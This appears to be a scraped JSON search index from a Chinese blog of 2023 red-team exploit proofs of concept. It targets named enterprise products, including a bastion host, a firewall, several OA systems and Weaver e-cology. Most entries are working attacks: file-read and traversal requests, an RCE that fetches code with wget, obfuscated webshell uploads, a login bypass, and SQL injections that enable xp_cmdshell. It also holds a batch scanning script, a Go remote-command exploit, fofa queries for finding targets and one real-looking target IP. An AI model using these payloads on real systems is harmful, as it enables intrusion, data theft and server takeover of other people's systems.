Version/12.0.3 Safari/605.1.15 Accept-Encoding: gzip, deflate Connection: close ","date":"2023-12-08","objectID":"/%E6%9F%90%E7%9B%9F-sas%E5%A0%A1%E5%9E%92%E6%9C%BA-%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw漏洞"],"title":"某盟 SAS堡垒机 漏洞","uri":"/%E6%9F%90%E7%9B%9F-sas%E5%A0%A1%E5%9E%92%E6%9C%BA-%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"某盟 SAS堡垒机 GetFile 任意文件读取漏洞 GET /api/virtual/home/status?cat=../../../../../../../../../../../../../../usr/local/nsfocus/web/apache2/www/local_user.php\u0026method=login\u0026user_account=admin HTTP/1.1 Host: 1.1.1.1 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Content-Type: application/x-www-form-urlencoded Accept-Encoding: gzip, deflate Connection: close ","date":"2023-12-08","objectID":"/%E6%9F%90%E7%9B%9F-sas%E5%A0%A1%E5%9E%92%E6%9C%BA-%E6%BC%8F%E6%B4%9E/:2:0","tags":["2023hw漏洞"],"title":"某盟 SAS堡垒机 漏洞","uri":"/%E6%9F%90%E7%9B%9F-sas%E5%A0%A1%E5%9E%92%E6%9C%BA-%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"某盟 SAS堡垒机 Exec 远程命令执行漏洞 GET /webconf/Exec/index?cmd=wget%20xxx.xxx.xxx HTTP/1.1 Host: 1.1.1.1 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Content-Type: application/x-www-form-urlencoded Accept-Encoding: gzip, deflate Connection: close ","date":"2023-12-08","objectID":"/%E6%9F%90%E7%9B%9F-sas%E5%A0%A1%E5%9E%92%E6%9C%BA-%E6%BC%8F%E6%B4%9E/:3:0","tags":["2023hw漏洞"],"title":"某盟 SAS堡垒机 漏洞","uri":"/%E6%9F%90%E7%9B%9F-sas%E5%A0%A1%E5%9E%92%E6%9C%BA-%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"某盟sas安全审计系统任意文件读取漏洞 /webconf/GetFile/indexpath=../../../../../../../../../../../../../../etc/passwd ","date":"2023-12-08","objectID":"/%E6%9F%90%E7%9B%9Fsas%E5%AE%89%E5%85%A8%E5%AE%A1%E8%AE%A1%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw漏洞"],"title":"某盟sas安全审计系统任意文件读取漏洞","uri":"/%E6%9F%90%E7%9B%9Fsas%E5%AE%89%E5%85%A8%E5%AE%A1%E8%AE%A1%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"某神 SecGate 3600 防火墙 obj_app_upfile 任意文件上传漏洞 POST /?g=obj_app_upfile HTTP/1.1 Host: x.x.x.x Accept: / Accept-Encoding: gzip, deflate Content-Length: 574 Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJpMyThWnAxbcBBQc User-Agent: Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0; Trident/4.0) ------WebKitFormBoundaryJpMyThWnAxbcBBQc Content-Disposition: form-data; name=\"MAX_FILE_SIZE\" 10000000 ------WebKitFormBoundaryJpMyThWnAxbcBBQc Content-Disposition: form-data; name=\"upfile\"; filename=\"vulntest.php\" Content-Type: text/plain \u003c?php php马?\u003e ------WebKitFormBoundaryJpMyThWnAxbcBBQc Content-Disposition: form-data; name=\"submit_post\" obj_app_upfile ------WebKitFormBoundaryJpMyThWnAxbcBBQc Content-Disposition: form-data; name=\"__hash__\" 0b9d6b1ab7479ab69d9f71b05e0e9445 ------WebKitFormBoundaryJpMyThWnAxbcBBQc-- 马儿路径：attachements/xxx.php ","date":"2023-12-08","objectID":"/%E6%9F%90%E7%A5%9E-secgate-3600-%E9%98%B2%E7%81%AB%E5%A2%99-obj_app_upfile-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw漏洞"],"title":"某神 SecGate 3600 防火墙 obj_app_upfile 任意文件上传漏洞","uri":"/%E6%9F%90%E7%A5%9E-secgate-3600-%E9%98%B2%E7%81%AB%E5%A2%99-obj_app_upfile-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"某神 SecSSL 3600安全接入网关系统 任意密码修改漏洞 POST /changepass.php?type=2 Cookie: admin_id=1; gw_user_ticket=ffffffffffffffffffffffffffffffff; last_step_param={\"this_name\":\"test\",\"subAuthId\":\"1\"} old_pass=\u0026password=Test123!@\u0026repassword=Test123!@ ","date":"2023-12-08","objectID":"/%E6%9F%90%E7%A5%9E-secssl-3600%E5%AE%89%E5%85%A8%E6%8E%A5%E5%85%A5%E7%BD%91%E5%85%B3%E7%B3%BB%E7%BB%9F-%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw漏洞"],"title":"某神 SecSSL 3600安全接入网关系统 任意密码修改漏洞","uri":"/%E6%9F%90%E7%A5%9E-secssl-3600%E5%AE%89%E5%85%A8%E6%8E%A5%E5%85%A5%E7%BD%91%E5%85%B3%E7%B3%BB%E7%BB%9F-%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"某联达oa 后台文件上传漏洞 POST /gtp/im/services/group/msgbroadcastuploadfile.aspx HTTP/1.1 Host: 10.10.10.1:8888 X-Requested-With: Ext.basex Accept: text/html, application/xhtml+xml, image/jxr, / Accept-Language: zh-Hans-CN,zh-Hans;q=0.5 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Accept-Encoding: gzip, deflate Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj Accept: / Origin: http://10.10.10.1 Referer: http://10.10.10.1:8888/Workflow/Workflow.aspx?configID=774d99d7-02bf-42ec-9e27-caeaa699f512\u0026menuitemid=120743\u0026frame=1\u0026modulecode=GTP.Workflow.TaskCenterModule\u0026tabID=40 Cookie: Connection: close Content-Length: 421 ------WebKitFormBoundaryFfJZ4PlAZBixjELj Content-Disposition: form-data; filename=\"1.aspx\";filename=\"1.jpg\" Content-Type: application/text \u003c%@ Page Language=\"Jscript\" Debug=true%\u003e \u003c% var FRWT='XeKBdPAOslypgVhLxcIUNFmStvYbnJGuwEarqkifjTHZQzCoRMWD'; var GFMA=Request.Form(\"qmq1\"); var ONOQ=FRWT(19) + FRWT(20) + FRWT(8) + FRWT(6) + FRWT(21) + FRWT(1); eval(GFMA, ONOQ); %\u003e ------WebKitFormBoundaryFfJZ4PlAZBixjELj-- ","date":"2023-12-08","objectID":"/%E6%9F%90%E8%81%94%E8%BE%BEoa-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw漏洞"],"title":"某联达oa 后台文件上传漏洞","uri":"/%E6%9F%90%E8%81%94%E8%BE%BEoa-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"## fofa\rtitle=\"移动信息服务管理\"||body=\"URL=/zftal-mobile\" ","date":"2023-12-08","objectID":"/%E6%AD%A3%E6%96%B9oa-oamobile_fjuploadbytype.html-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"正方OA oaMobile_fjUploadByType.html 任意文件上传漏洞","uri":"/%E6%AD%A3%E6%96%B9oa-oamobile_fjuploadbytype.html-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"exp detail: ID: 4826 Author: Neo Name: 正方OA任意文件上传漏洞 Description: 文件上传漏洞是web系统中常见的一种功能，通过文件上传能实现上传图片、视频，以及其他类型的文件，但是随着web中包含的功能越来越多，潜在的网络安全风险也就越大。 如果恶意用户上传了可执行的文件或者脚本，就会导致网站被其控制甚至会使其服务器沦陷，以至于引发恶意的网络安全事件。 Identifier: DVB: DVB-2023-4826 VulnClass: - 任意文件上传 Category: - 应用服务 Manufacturer: 正方 Product: 移动信息服务管理系统 Type: 1 Status: 1 Scanable: 1 Level: 3 DisclosureDate: '2023-08-04' VulnImpact: 文件上传漏洞是web系统中常见的一种功能，通过文件上传能实现上传图片、视频，以及其他类型的文件，但是随着web中包含的功能越来越多，潜在的网络安全风险也就越大。 如果恶意用户上传了可执行的文件或者脚本，就会导致网站被其控制甚至会使其服务器沦陷，以至于引发恶意的网络安全事件。 Is0day: true IncludeExp: false Weakable: false IsXc: false IsCommon: false IsCallBack: false Condition: title=\"移动信息服务管理\"||body=\"URL=/zftal-mobile\" Solutions: - 请关注厂商的修复版本，并及时更新到最新版本. poc: relative: req0 \u0026\u0026 req1 session: false get_variables: - randomfile: randomLowerCase(5) requests: - method: POST timeout: 10 path: /zftal-mobile/oaMobile/oaMobile_fjUploadByType.html headers: User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.1707.77 Safari/537.36 data: yhm: '123' zid: '456' sign: '789' follow_redirects: true matches: code.eq(\"200\") files: file: - 409.jsp/ - data:text/plain;base64,PCUgIG91dC5wcmludGxuKCJ0ZXN0MTIzIik7bmV3ICBqYXZhLmlvLkZpbGUoYXBwbGljYXRpb24uZ2V0UmVhbFBhdGgocmVxdWVzdC5nZXRTZXJ2bGV0UGF0aCgpKSkuZGVsZXRlKCk7ICAlPg== - '' - method: GET timeout: 10 path: /zftal-mobile/oaFjUploadByType/409.jsp headers: User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.1707.77 Safari/537.36 follow_redirects: true matches: (code.eq(\"200\") \u0026\u0026 body.contains(\"test123\")) ","date":"2023-12-08","objectID":"/%E6%AD%A3%E6%96%B9oa-oamobile_fjuploadbytype.html-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw"],"title":"正方OA oaMobile_fjUploadByType.html 任意文件上传漏洞","uri":"/%E6%AD%A3%E6%96%B9oa-oamobile_fjuploadbytype.html-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"```\r/tomcat.jsp?dataName=role_id\u0026dataValue=1 /tomcat.jsp?dataName=user_id\u0026dataValue=1 **然后访问后台：/main.screen** ","date":"2023-12-08","objectID":"/%E6%B1%89%E5%BE%97srm-tomcat.jsp-%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"汉得SRM tomcat.jsp 登录绕过漏洞","uri":"/%E6%B1%89%E5%BE%97srm-tomcat.jsp-%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"汉得SRM tomcat.jsp 登录绕过漏洞 /tomcat.jsp?dataName=role_id\u0026dataValue=1 /tomcat.jsp?dataName=user_id\u0026dataValue=1 然后访问后台：/main.screen ","date":"2023-12-08","objectID":"/%E6%B1%89%E5%BE%97srm-tomcat.jsp-%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw漏洞"],"title":"汉得SRM tomcat.jsp 登录绕过漏洞","uri":"/%E6%B1%89%E5%BE%97srm-tomcat.jsp-%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"```\rPOST /dwr/call/plaincall/CptDwrUtil.ifNewsCheckOutByCurrentUser.dwr HTTP/1.1 Host: ip:port User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36 Connection: close Content-Length: 189 Content-Type: text/plain Accept-Encoding: gzip callCount=1 page= httpSessionId= scriptSessionId= c0-scriptName=DocDwrUtil c0-methodName=ifNewsCheckOutByCurrentUser c0-id=0 c0-param0=string:1 AND 1=1 c0-param1=string:1 batchId=0 ","date":"2023-12-08","objectID":"/%E6%B3%9B%E5%BE%AE-e-cology-ifnewscheckoutbycurrentuser-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"泛微 E-Cology ifNewsCheckOutByCurrentUser sql注入漏洞","uri":"/%E6%B3%9B%E5%BE%AE-e-cology-ifnewscheckoutbycurrentuser-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"```\rmobile/plugin/Download.jsp?sessionkey=1’ EXEC sp_configure ‘show advanced options’,1 RECONFIGURE EXEC sp_configure ‘xp_cmdshell’,1 RECONFIGURE exec master..xp_cmdshell ‘ping 4a9c47b1.dnslog.click ","date":"2023-12-08","objectID":"/%E6%B3%9B%E5%BE%AE-e-mobile-download.jsp-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/:0:0","tags":["2023hw"],"title":"泛微 E-Mobile Download.jsp 远程代码执行","uri":"/%E6%B3%9B%E5%BE%AE-e-mobile-download.jsp-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"},{"categories":["2023hw漏洞"],"content":"泛微 HrmCareerApplyPerView sql注入漏洞 GET /pweb/careerapply/HrmCareerApplyPerView.jsp?id=1%20union%20select%201,2,sys.fn_sqlvarbasetostr(db_name()),db_name(1),5,6,7 HTTP/1.1 Host: 127.0.0.1:7443 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML,like Gecko) Accept-Encoding: gzip, deflate Connection: close ","date":"2023-12-08","objectID":"/%E6%B3%9B%E5%BE%AE-hrmcareerapplyperview-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw漏洞"],"title":"泛微 HrmCareerApplyPerView sql注入漏洞","uri":"/%E6%B3%9B%E5%BE%AE-hrmcareerapplyperview-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"```\rGET /weaver/weaver.docs.docs.ShowDocsImageServlet?docId=* HTTP/1.1 Host: 127.0.0.1 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Accept-Encoding: gzip, deflate Connection: close ","date":"2023-12-08","objectID":"/%E6%B3%9B%E5%BE%AE-showdocsimagesql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"泛微 ShowDocsImagesql注入漏洞","uri":"/%E6%B3%9B%E5%BE%AE-showdocsimagesql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"```\rhttp://URL/E-mobile/App/Init.php?weiApi=1\u0026sessionkey=ee651bec023d0db0c233fcb562ec7673_admin\u0026m=12344554_../../attachment/xxx.xls ","date":"2023-12-08","objectID":"/%E6%B3%9B%E5%BE%AE-weaver-e-office9-%E5%89%8D%E5%8F%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/:0:0","tags":["2023hw"],"title":"泛微 Weaver E-Office9 前台文件包含","uri":"/%E6%B3%9B%E5%BE%AE-weaver-e-office9-%E5%89%8D%E5%8F%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"},{"categories":["2023hw"],"content":"## fofa\rbody=\"/js/ecology8\" || body=\"wui/common/css/w7OVFont_wev8.css\" || (body=\"weaver\" \u0026\u0026 body=\"ecology\") || (header=\"ecology_JSessionId\" \u0026\u0026 body=\"login/Login.jsp\") || body=\"/wui/index.html\" || body=\"jquery_wev8\" ","date":"2023-12-08","objectID":"/%E6%B3%9B%E5%BE%AEe-cology-gete9developallnamevalue2-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/:0:0","tags":["2023hw"],"title":"泛微E-cology getE9DevelopAllNameValue2 敏感信息泄露","uri":"/%E6%B3%9B%E5%BE%AEe-cology-gete9developallnamevalue2-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"},{"categories":["2023hw"],"content":"poc api/portalTsLogin/utils/getE9DevelopAllNameValue2?fileName=portaldev_%2f%2e%2e%2fweaver%2eproperties http://112.47.63.233:82/api/portalTsLogin/utils/getE9DevelopAllNameValue2?fileName=portaldev_%2f%2e%2e%2fweaver%2eproperties ","date":"2023-12-08","objectID":"/%E6%B3%9B%E5%BE%AEe-cology-gete9developallnamevalue2-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/:1:0","tags":["2023hw"],"title":"泛微E-cology getE9DevelopAllNameValue2 敏感信息泄露","uri":"/%E6%B3%9B%E5%BE%AEe-cology-gete9developallnamevalue2-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"},{"categories":["2023hw漏洞"],"content":"泛微e-cology9_SQL注入-CNVD-2023-12632 ","date":"2023-12-08","objectID":"/%E6%B3%9B%E5%BE%AEe-cology9_sql%E6%B3%A8%E5%85%A5-cnvd-2023-12632/:1:0","tags":["2023hw漏洞"],"title":"泛微e-cology9_SQL注入-CNVD-2023-12632","uri":"/%E6%B3%9B%E5%BE%AEe-cology9_sql%E6%B3%A8%E5%85%A5-cnvd-2023-12632/"},{"categories":["2023hw漏洞"],"content":"影响版本 泛微e-cology V9\u003c10.56 ","date":"2023-12-08","objectID":"/%E6%B3%9B%E5%BE%AEe-cology9_sql%E6%B3%A8%E5%85%A5-cnvd-2023-12632/:2:0","tags":["2023hw漏洞"],"title":"泛微e-cology9_SQL注入-CNVD-2023-12632","uri":"/%E6%B3%9B%E5%BE%AEe-cology9_sql%E6%B3%A8%E5%85%A5-cnvd-2023-12632/"},{"categories":["2023hw漏洞"],"content":"fofa app=\"泛微-协同商务系统\" ","date":"2023-12-08","objectID":"/%E6%B3%9B%E5%BE%AEe-cology9_sql%E6%B3%A8%E5%85%A5-cnvd-2023-12632/:3:0","tags":["2023hw漏洞"],"title":"泛微e-cology9_SQL注入-CNVD-2023-12632","uri":"/%E6%B3%9B%E5%BE%AEe-cology9_sql%E6%B3%A8%E5%85%A5-cnvd-2023-12632/"},{"categories":["2023hw漏洞"],"content":"poc POST /mobile/%20/plugin/browser.jsp HTTP/1.1 Host: ip:port User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0 Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 649 isDis=1\u0026browserTypeId=269\u0026keyword=%25%32%35%25%33%36%25%33%31%25%32%35%25%33%32%25%33%37%25%32%35%25%33%32%25%33%30%25%32%35%25%33%37%25%33%35%25%32%35%25%33%36%25%36%35%25%32%35%25%33%36%25%33%39%25%32%35%25%33%36%25%36%36%25%32%35%25%33%36%25%36%35%25%32%35%25%33%32%25%33%30%25%32%35%25%33%37%25%33%33%25%32%35%25%33%36%25%33%35%25%32%35%25%33%36%25%36%33%25%32%35%25%33%36%25%33%35%25%32%35%25%33%36%25%33%33%25%32%35%25%33%37%25%33%34%25%32%35%25%33%32%25%33%30%25%32%35%25%33%33%25%33%31%25%32%35%25%33%32%25%36%33%25%32%35%25%33%32%25%33%37%25%32%35%25%33%32%25%33%37%25%32%35%25%33%32%25%36%32%25%32%35%25%33%32%25%33%38%25%32%35%25%33%35%25%33%33%25%32%35%25%33%34%25%33%35%25%32%35%25%33%34%25%36%33%25%32%35%25%33%34%25%33%35%25%32%35%25%33%34%25%33%33%25%32%35%25%33%35%25%33%34%25%32%35%25%33%32%25%33%30%25%32%35%25%33%34%25%33%30%25%32%35%25%33%34%25%33%30%25%32%35%25%33%35%25%33%36%25%32%35%25%33%34%25%33%35%25%32%35%25%33%35%25%33%32%25%32%35%25%33%35%25%33%33%25%32%35%25%33%34%25%33%39%25%32%35%25%33%34%25%36%36%25%32%35%25%33%34%25%36%35%25%32%35%25%33%32%25%33%39%25%32%35%25%33%32%25%36%32%25%32%35%25%33%32%25%33%37 payload需要经过三次url编码，文末附tamper脚本地址 ","date":"2023-12-08","objectID":"/%E6%B3%9B%E5%BE%AEe-cology9_sql%E6%B3%A8%E5%85%A5-cnvd-2023-12632/:4:0","tags":["2023hw漏洞"],"title":"泛微e-cology9_SQL注入-CNVD-2023-12632","uri":"/%E6%B3%9B%E5%BE%AEe-cology9_sql%E6%B3%A8%E5%85%A5-cnvd-2023-12632/"},{"categories":["2023hw漏洞"],"content":"批量检测脚本 import argparse import requests from termcolor import colored import signal # Disable SSL certificate verification requests.packages.urllib3.disable_warnings() output_file = None # 全局变量 def check_url(url, output=None): headers = { \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\", \"Accept-Encoding\": \"gzip, deflate\", \"Accept-Language\": \"zh-CN,zh;q=0.9\", \"Connection\": \"close\" } proxies = { 'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080' } data = { \"isDis\": \"1\", \"browserTypeId\": \"269\", \"keyword\": \"%25%36%31%25%32%37%25%32%30%25%37%35%25%36%65%25%36%39%25%36%66%25%36%65%25%32%30%25%37%33%25%36%35%25%36%63%25%36%35%25%36%33%25%37%34%25%32%30%25%33%31%25%32%63%25%32%37%25%32%37%25%32%62%25%32%38%25%35%33%25%34%35%25%34%63%25%34%35%25%34%33%25%35%34%25%32%30%25%34%30%25%34%30%25%35%36%25%34%35%25%35%32%25%35%33%25%34%39%25%34%66%25%34%65%25%32%39%25%32%62%25%32%37\" } try: modified_url = url + '/mobile/%20/plugin/browser.jsp' response = requests.post(modified_url, data=data, headers=headers, verify=False, timeout=3) content = response.text if \"show2\" in content: result = colored(url + \" 存在\", 'red') if output: with open(output, 'a') as file: # 以追加模式打开文件 file.write(url + '\\n') print(result) # 即时打印结果 else: result = url + \" 不存在\" print(result) # 即时打印结果 except requests.exceptions.RequestException as e: pass # 不进行任何操作，直接请求下一个URL def check_urls_from_file(filename, output=None): with open(filename, 'r') as file: url_list = file.read().strip().split('\\n') for url in url_list: check_url(url, output) # 捕获中断信号 signal.signal(signal.SIGINT, handle_interrupt) def handle_interrupt(signum, frame): global output_file # 在捕获中断时保存当前扫描结果，并关闭文件 if output_file: output_file.close() print(\"\\n扫描已中断并保存当前结果。\") exit() def main(): global output_file parser = argparse.ArgumentParser(description='CNVD-2023-12632检测POC') parser.add_argument('-u', '--url', help='检测单个URL') parser.add_argument('-r', '--file', help='从文本中批量检测URL') parser.add_argument('-o', '--output', help='将检测到的输出到文本中') args = parser.parse_args() if args.output: output_file = open(args.output, 'a') # 以追加模式打开输出文件 if args.url: check_url(args.url, args.output) elif args.file: check_urls_from_file(args.file, args.output) else: parser.print_help() # 注册捕获中断信号的处理程序 signal.signal(signal.SIGINT, handle_interrupt) # 关闭输出文件 if output_file: output_file.close() if __name__ == '__main__': author_name = \"-----------------------------========================== SharpKean\" print(\"Author：\", author_name) main() ","date":"2023-12-08","objectID":"/%E6%B3%9B%E5%BE%AEe-cology9_sql%E6%B3%A8%E5%85%A5-cnvd-2023-12632/:5:0","tags":["2023hw漏洞"],"title":"泛微e-cology9_SQL注入-CNVD-2023-12632","uri":"/%E6%B3%9B%E5%BE%AEe-cology9_sql%E6%B3%A8%E5%85%A5-cnvd-2023-12632/"},{"categories":["2023hw漏洞"],"content":"脚本来源 https://github.com/SharpKean/CNVD-2023-12632_POC https://github.com/ChinaRan0/3url ","date":"2023-12-08","objectID":"/%E6%B3%9B%E5%BE%AEe-cology9_sql%E6%B3%A8%E5%85%A5-cnvd-2023-12632/:6:0","tags":["2023hw漏洞"],"title":"泛微e-cology9_SQL注入-CNVD-2023-12632","uri":"/%E6%B3%9B%E5%BE%AEe-cology9_sql%E6%B3%A8%E5%85%A5-cnvd-2023-12632/"},{"categories":["2023hw漏洞"],"content":"泛微E-MobileServer远程命令执行漏洞 ","date":"2023-12-08","objectID":"/%E6%B3%9B%E5%BE%AEe-mobileserver%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw漏洞"],"title":"泛微E-MobileServer远程命令执行漏洞","uri":"/%E6%B3%9B%E5%BE%AEe-mobileserver%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"go语言 poc package main import ( \"bytes\" \"fmt\" \"github.com/hpifu/go-kit/hflag\" \"io/ioutil\" \"mime/multipart\" \"net/http\" \"net/url\" \"os\" \"strings\" ) func main() { t, c := getParam() exploit(t, c) } func exploit(host, command string) { p := \"1';CREATE ALIAS if not exists MzSNqKsZTagm AS CONCAT('void e(String cmd) throws java.la','ng.Exception{','Object curren','tRequest = Thre','ad.currentT','hread().getConte','xtClass','Loader().loadC','lass(\\\"com.caucho.server.dispatch.ServletInvocation\\\").getMet','hod(\\\"getContextRequest\\\").inv','oke(null);java.la','ng.reflect.Field _responseF = currentRequest.getCl','ass().getSuperc','lass().getDeclar','edField(\\\"_response\\\");_responseF.setAcce','ssible(true);Object response = _responseF.get(currentRequest);java.la','ng.reflect.Method getWriterM = response.getCl','ass().getMethod(\\\"getWriter\\\");java.i','o.Writer writer = (java.i','o.Writer)getWriterM.inv','oke(response);java.ut','il.Scan','ner scan','ner = (new java.util.Scann','er(Runt','ime.getRunt','ime().ex','ec(cmd).getInput','Stream())).useDelimiter(\\\"\\\\\\\\A\\\");writer.write(scan','ner.hasNext()?sca','nner.next():\\\"\\\");}');CALL MzSNqKsZTagm('\" + url.QueryEscape(command) + \"');--\" c := http.Client{} buffer := \u0026bytes.Buffer{} writer := multipart.NewWriter(buffer) field, _ := writer.CreateFormField(\"method\") field.Write([]byte(\"create\")) formField, _ := writer.CreateFormField(\"typeName\") formField.Write([]byte(p)) _ = writer.Close() target := strings.Replace(host+\"/messageType.do\", \"//mess\", \"/mess\", 1) request, _ := http.NewRequest(http.MethodPost, target, strings.NewReader(buffer.String())) request.Header.Set(\"User-Agent\", \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36\") request.Header.Set(\"Accept\", \"*/*\") request.Header.Set(\"Connection\", \"close\") request.Header.Set(\"Content-Type\", writer.FormDataContentType()) request.Header.Set(\"Content-Length\", \"1142\") request.Header.Set(\"Accept-Encoding\", \"\") do, err := c.Do(request) if err != nil { fmt.Println(err) } defer func() { _ = do.Body.Close() }() all, err := ioutil.ReadAll(do.Body) if err != nil { fmt.Println(err) } if string(all) == \"{\\\"status\\\":false}\" { fmt.Println(\"无效的命令,也许是服务器不支持或其他情况\") return } result := strings.Replace(fmt.Sprintf(\"%s\", all), \"{\\\"status\\\":false,\\\"ID\\\":\\\"1\\\",\\\"msg\\\":\\\"推送类型已存在\\\"}\", \"\", -1) fmt.Println(\"\\n\", result) } func getParam() (t, c string) { hflag.AddFlag(\"target\", \"泛微E-MobileServer-地址\", hflag.Required(), hflag.Shorthand(\"t\")) hflag.AddFlag(\"command\", \"待执行的系统命令\", hflag.Required(), hflag.Shorthand(\"c\")) if err := hflag.Parse(); err != nil { fmt.Println(hflag.Usage()) os.Exit(0) } return hflag.GetString(\"target\"), hflag.GetString(\"command\") } ","date":"2023-12-08","objectID":"/%E6%B3%9B%E5%BE%AEe-mobileserver%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":["2023hw漏洞"],"title":"泛微E-MobileServer远程命令执行漏洞","uri":"/%E6%B3%9B%E5%BE%AEe-mobileserver%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"poc使用 go run poc.go -t http://目标 -c 执行命令 